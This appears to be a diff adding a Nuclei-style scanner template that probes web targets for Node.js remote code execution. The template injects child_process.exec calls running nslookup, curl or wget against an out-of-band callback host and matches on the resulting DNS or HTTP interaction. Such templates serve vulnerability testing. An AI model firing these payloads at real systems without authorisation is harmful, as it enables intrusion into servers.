@@ -1,0 +1,26 @@
+id: nodejs-rce
+
+info:
+  name: NodeJS RCE
+  author: reewardius
+  reference: https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44
+  severity: critical
+  tags: rce
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{url_encode(require('child_process').exec('nslookup {{interactsh-url}}'))}}"
+      - "{{BaseURL}}/{{url_encode(require('child_process').exec('curl http://{{interactsh-url}}'))}}"
+      - "{{BaseURL}}/{{url_encode(require('child_process').exec('wget http://{{interactsh-url}}'))}}"
+      - "{{BaseURL}}/{{url_encode(require('child_process').exec('nslookup {{interactsh-url}}');{src:/bin/sh/})}}"
+      - "{{BaseURL}}/{{url_encode(require('child_process').exec('curl http://{{interactsh-url}}');{src:/bin/sh/})}}"
+      - "{{BaseURL}}/{{url_encode(require('child_process').exec('wget http://{{interactsh-url}}');{src:/bin/sh/})}}"
+      
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "http"
+          - "dns"
